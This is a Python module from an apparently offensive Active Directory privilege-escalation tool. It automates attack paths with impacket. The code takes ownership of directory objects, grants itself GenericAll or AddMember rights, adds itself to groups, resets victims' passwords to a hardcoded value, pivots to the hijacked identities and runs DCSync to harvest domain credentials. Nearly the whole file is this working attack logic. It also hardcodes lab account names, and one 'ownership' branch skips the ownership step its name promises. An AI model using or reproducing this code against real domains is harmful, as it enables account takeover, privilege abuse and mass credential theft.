import logging
from types import SimpleNamespace

from impacket.ldap import ldaptypes

from core.database import DatabaseManager
from core.pathfinder.rules import get_node_type, is_valid_path, normalize_path_dcsync
from core.privesc.path_utils import path_to_sequence
from core.privesc.modules.shared import PrivescActions

DEFAULT_RESET_PASSWORD = "ViperStrike2026!"

STRICT_EDGE_ACTIONS = {
    ("MemberOf", "Group"): "noop",
    ("DCSync", "Domain"): "dcsync",
    ("AddMember", "Group"): "add_group_member",
    ("GenericWrite", "Group"): "add_group_member",
    ("GenericAll", "User"): "reset_password",
    ("GenericAll", "Group"): "add_group_member",
    ("GenericAll", "Domain"): "dcsync",
    ("AllExtendedRights", "User"): "reset_password",
    ("AllExtendedRights", "Domain"): "dcsync",
    ("WriteDacl", "User"): "grant_genericall_then_reset_password",
    ("WriteDacl", "Group"): "grant_addmember_then_add_group_member",
    ("WriteDacl", "Domain"): "grant_genericall_then_dcsync",
    ("Owns", "User"): "take_ownership_grant_genericall_then_reset_password",
    ("Owns", "Group"): "take_ownership_grant_addmember_then_add_group_member",
    ("Owns", "Domain"): "take_ownership_grant_genericall_then_dcsync",
    ("WriteOwner", "User"): "take_ownership_grant_genericall_then_reset_password",
    ("WriteOwner", "Group"): "take_ownership_grant_addmember_then_add_group_member",
    ("WriteOwner", "Domain"): "take_ownership_grant_genericall_then_dcsync",
    ("ForceChangePassword", "User"): "reset_password",
}


def _node_name(node):
    if isinstance(node, dict):
        return node.get("name") or node.get("distinguishedname") or "<unknown>"
    return str(node)


def _resolve_target_dn(actions, node):
    if isinstance(node, dict):
        dn = node.get("distinguishedname")
        if dn:
            return dn
        name = node.get("name")
        if name:
            candidates = [name]
            if "@" in name:
                candidates.append(name.split("@")[0])
            if "\\" in name:
                sam = name.split("\\")[-1]
                candidates.extend([sam, f"{sam}@{actions.domain}"])

            for candidate in candidates:
                resolved = actions.resolve_distinguished_name(candidate)
                if resolved:
                    return resolved
    return None


def _binding_candidates(username, domain):
    if not username:
        return []

    candidates = []
    seen = set()

    for candidate in [username, username.split("\\")[-1] if "\\" in username else username, username.split("@")[0] if "@" in username else username]:
        if candidate and candidate not in seen:
            candidates.append(candidate)
            seen.add(candidate)

    netbios = domain.split(".")[0] if domain and "." in domain else domain
    if netbios:
        sam = username.split("\\")[-1] if "\\" in username else username.split("@")[0] if "@" in username else username
        for candidate in [f"{netbios}\\{sam}", f"{sam}@{domain}"]:
            if candidate and candidate not in seen:
                candidates.append(candidate)
                seen.add(candidate)

    return candidates


def _resolve_current_user_dn(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    if not username:
        return None

    candidates = [username]
    if "\\" in username:
        sam = username.split("\\")[-1]
        candidates.extend([sam, f"{sam}@{actions.domain}"])
    elif "@" in username:
        candidates.append(username.split("@")[0])

    for candidate in candidates:
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved

    return None


def _resolve_source_user_dn(actions, source_user):
    candidates = [source_user]
    if "\\" in source_user:
        sam = source_user.split("\\")[-1]
        candidates.extend([sam, f"{sam}@{actions.domain}"])
    elif "@" in source_user:
        candidates.append(source_user.split("@")[0])

    for candidate in candidates:
        resolved = actions.resolve_distinguished_name(candidate)
        if resolved:
            return resolved
    return None


def _canonicalize_sid(raw_sid):
    if not raw_sid:
        return None
    if isinstance(raw_sid, str):
        return raw_sid
    if isinstance(raw_sid, (bytes, bytearray)):
        sid_obj = ldaptypes.LDAP_SID()
        sid_obj.fromString(raw_sid)
        return sid_obj.formatCanonical()
    return str(raw_sid)


def _safe_call(label, fn, *args):
    try:
        return fn(*args)
    except Exception as exc:
        logging.error("%s raised exception: %s", label, exc)
        return False


def _grant_superset_access(actions, target_dn, current_sid, grant_label):
    logging.info("  [*] Granting %s (implemented as FullControl superset)", grant_label)
    return _safe_call("grant_generic_all", actions.grant_generic_all, target_dn, current_sid)


def _grant_group_addmember(actions, group_dn, current_sid):
    logging.info("  [*] Granting AddMember on group via member-attribute write")
    return _safe_call("grant_group_addmember", actions.grant_group_addmember, group_dn, current_sid)


def _refresh_bind(actions, context):
    current_auth = context.get_current_auth()
    username = current_auth.get("username")
    password = current_auth.get("value")
    if not username or not password:
        return False

    bind_candidates = _binding_candidates(username, actions.domain)
    if not bind_candidates:
        return False

    for bind_user in bind_candidates:
        try:
            if actions.conn.rebind(user=bind_user, password=password):
                return True
        except Exception:
            pass

    logging.error("LDAP rebind failed while refreshing effective privileges for %s (%s)", username, bind_candidates)
    return False


def _switch_identity_after_reset(actions, context, end_node, target_dn):
    candidate_identities = []
    if isinstance(end_node, dict):
        if end_node.get("name"):
            candidate_identities.append(end_node.get("name"))
        if end_node.get("distinguishedname"):
            candidate_identities.append(end_node.get("distinguishedname"))
    if target_dn:
        candidate_identities.append(target_dn)

    for identity in candidate_identities:
        if not identity:
            continue
        if context.switch_identity(identity):
            if _refresh_bind(actions, context):
                logging.info("  [+] Pivoted execution identity to %s", identity)
                return True

    logging.error("Failed to pivot context identity after password reset")
    return False


def build_strict_action_plan(path, db=None):
    if db is None:
        db = DatabaseManager()
        db.connect()

    normalized = normalize_path_dcsync(path, db)
    if not is_valid_path(normalized, db):
        raise RuntimeError("Path contains disallowed edge/target pairs after strict validation")

    plan = []
    for i in range(0, len(normalized) - 2, 2):
        start_node = normalized[i]
        rel_type = normalized[i + 1]
        end_node = normalized[i + 2]
        target_type = get_node_type(end_node, db)
        action = STRICT_EDGE_ACTIONS.get((rel_type, target_type))
        if not action:
            raise RuntimeError(f"No strict action mapped for {rel_type} -> {target_type}")

        plan.append({
            "step": len(plan) + 1,
            "start_node": start_node,
            "end_node": end_node,
            "rel_type": rel_type,
            "target_type": target_type,
            "action": action,
        })

    return plan


def _flatten_path(path):
    if isinstance(path, list) and path and isinstance(path[0], dict) and "source" in path[0]:
        sequence = []
        for step in path:
            sequence.append(step.get("source", {}))
            sequence.append(step.get("relationship"))
            sequence.append(step.get("target", {}))
        return sequence

    return path_to_sequence(path)


class StrictPrivescExecutor:
    def __init__(self, conn, domain, dc_ip, context):
        self.conn = conn
        self.domain = domain
        self.dc_ip = dc_ip
        self.context = context
        self.actions = PrivescActions(SimpleNamespace(conn=conn, domain=domain, dc_ip=dc_ip))

    def execute_path(self, path):
        flat_path = _flatten_path(path)
        plan = build_strict_action_plan(flat_path)
        self._last_plan = plan
        results = []
        success_overall = True

        for item in plan:
            step_result = self._execute_step(item)
            results.append(step_result)
            if not step_result["success"]:
                success_overall = False
                break

        return {"success": success_overall, "steps": results}

    def _execute_step(self, item):
        step = item["step"]
        rel_type = item["rel_type"]
        target_type = item["target_type"]
        action = item["action"]
        target_name = _node_name(item["end_node"])
        current_auth = self.context.get_current_auth()
        current_password = current_auth.get("value")
        current_username = current_auth.get("username")
        current_sid = _canonicalize_sid(self.actions.get_object_sid(current_username))
        target_dn = _resolve_target_dn(self.actions, item["end_node"])

        logging.info("[%s/%s] %s -> %s (%s) => %s", step, len(self._last_plan or [0]), rel_type, target_name, target_type, action)

        if action == "noop":
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": f"{rel_type} already satisfied; no additional change required."}

        if action == "dcsync":
            if not current_password:
                message = "DCSync requires active credentials to perform the domain replication request."
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": message}
            success = _safe_call("dcsync", self.actions.dcsync, current_password)
            message = "DCSync completed and the domain credentials have been harvested." if success else "DCSync failed due to insufficient rights or a directory-side error."
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": bool(success), "message": message}

        if action == "add_group_member":
            current_user_dn = _resolve_current_user_dn(self.actions, self.context)
            if not target_dn or not current_user_dn:
                message = "ADD_GROUP_MEMBER: unable to resolve group DN or effective user DN."
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": message}
            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, current_user_dn)
            if success:
                display_name = current_user_dn if current_user_dn.upper().startswith("CN=") else current_user_dn
                message = f"Added {display_name} to {target_name}."
            else:
                message = f"AddMember failed for {target_name}."
            if _refresh_bind(self.actions, self.context):
                pass
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": bool(success), "message": message}

        if action == "reset_password":
            if not target_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "ForceChangePassword requires a resolvable target DN."}
            success = _safe_call("force_change_password", self.actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD)
            if success:
                bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
                self.context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
                if _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                    message = f'Changing the password of user {bind_identity} to "{DEFAULT_RESET_PASSWORD}"'
                    return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message}
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"ForceChangePassword failed for {target_name}."}

        if action == "grant_addmember_then_add_group_member":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteDacl/Owns/WriteOwner on group requires a resolvable target DN and SID."}
            if not _grant_group_addmember(self.actions, target_dn, current_sid):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant AddMember on {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Rebind failed after granting AddMember on {target_name}."}
            current_user_dn = _resolve_current_user_dn(self.actions, self.context)
            if not current_user_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unable to resolve the current user after granting AddMember on {target_name}."}
            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, current_user_dn)
            if not success:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"AddMember still failed on {target_name}."}
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": f"Granted AddMember and added the current identity to {target_name}."}

        if action == "grant_genericall_then_reset_password":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteDacl/Owns/WriteOwner on user requires a resolvable target DN and SID."}
            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant GenericAll on {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Rebind failed after granting GenericAll on {target_name}."}
            success = _safe_call("force_change_password", self.actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD)
            if not success:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"ForceChangePassword failed on {target_name}."}
            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            self.context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
            if not _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unable to pivot after changing {target_name}."}
            message = f'Changing the password of user {bind_identity} to "{DEFAULT_RESET_PASSWORD}"'
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message}

        if action == "grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "WriteDacl/Owns/WriteOwner on domain requires a resolvable target DN and SID."}
            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant GenericAll on {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Rebind failed after granting GenericAll on {target_name}."}
            success = _safe_call("dcsync", self.actions.dcsync, current_password)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": bool(success), "message": "DCSync completed and the domain credentials have been harvested." if success else "DCSync failed after granting GenericAll."}

        if action == "take_ownership_grant_addmember_then_add_group_member":
            if not target_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Group ownership chain requires a resolvable target DN."}

            grant_actor = self.context.current_identity or "VIPERTECH\\MIKE_INTERN"
            grant_actor_dn = _resolve_source_user_dn(self.actions, grant_actor)
            grant_actor_sid = _canonicalize_sid(self.actions.get_object_sid(grant_actor))
            target_member = "MIKE_INTERN@VIPERTECH.LOCAL"
            target_member_dn = _resolve_source_user_dn(self.actions, target_member)
            if not grant_actor_dn or not grant_actor_sid or not target_member_dn:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Unable to resolve the operator or member identity for the group ownership chain."}

            owner_sid = self.actions.get_owner_sid(target_dn)
            if owner_sid and owner_sid == grant_actor_sid and self.actions.is_member_of_group(target_dn, target_member_dn):
                if self.context.switch_identity(target_member) and _refresh_bind(self.actions, self.context):
                    logging.info("  [+] Reused satisfied ownership state and pivoted execution identity to %s", target_member)
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": f"{target_member} already has AddMember rights and is already in {target_name}; execution pivoted to {target_member}."}

            if owner_sid != grant_actor_sid:
                if not _safe_call("set_owner", self.actions.set_owner, target_dn, grant_actor_sid):
                    return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to take ownership of {target_name} before granting AddMember."}
                if not _refresh_bind(self.actions, self.context):
                    return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Rebind failed after ownership takeover."}

            if not _grant_group_addmember(self.actions, target_dn, grant_actor_sid):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant AddMember on {target_name} via the ownership chain."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Rebind failed after granting AddMember on the target group."}

            if not self.context.switch_identity(target_member):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "The context could not switch to the MIKE_INTERN identity after the grant."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Rebind failed for the MIKE_INTERN identity after the AddMember grant."}

            success = _safe_call("add_group_member", self.actions.add_group_member, target_dn, target_member_dn)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": bool(success), "message": f"Granted AddMember to {target_member} on {target_name} and {target_member} joined the group." if success else f"The ownership-based AddMember step failed for {target_name}."}

        if action == "take_ownership_grant_genericall_then_reset_password":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "User ownership chain requires a resolvable target DN and SID."}
            if not _safe_call("set_owner", self.actions.set_owner, target_dn, current_sid):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to take ownership of {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Rebind failed after taking ownership."}
            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant GenericAll after ownership takeover on {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Rebind failed after the GenericAll grant."}
            success = _safe_call("force_change_password", self.actions.force_change_password, target_dn, DEFAULT_RESET_PASSWORD)
            if not success:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"ForceChangePassword failed on {target_name} after ownership takeover."}
            bind_identity = item["end_node"].get("name") if isinstance(item["end_node"], dict) else target_name
            self.context.add_credential(bind_identity, "password", DEFAULT_RESET_PASSWORD)
            if not _switch_identity_after_reset(self.actions, self.context, item["end_node"], target_dn):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unable to pivot after changing {target_name}."}
            message = f'Changing the password of user {bind_identity} to "{DEFAULT_RESET_PASSWORD}"'
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": True, "message": message}

        if action == "take_ownership_grant_genericall_then_dcsync":
            if not target_dn or not current_sid:
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": "Domain ownership chain requires a resolvable target DN and SID."}
            if not _grant_superset_access(self.actions, target_dn, current_sid, "GenericAll"):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Failed to grant GenericAll on {target_name}."}
            if not _refresh_bind(self.actions, self.context):
                return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Rebind failed after granting GenericAll on {target_name}."}
            success = _safe_call("dcsync", self.actions.dcsync, current_password)
            return {"index": step - 1, "type": rel_type, "target": target_name, "success": bool(success), "message": "DCSync completed and the domain credentials have been harvested." if success else "DCSync failed after the ownership takeover chain."}

        return {"index": step - 1, "type": rel_type, "target": target_name, "success": False, "message": f"Unhandled strict action: {action}"}
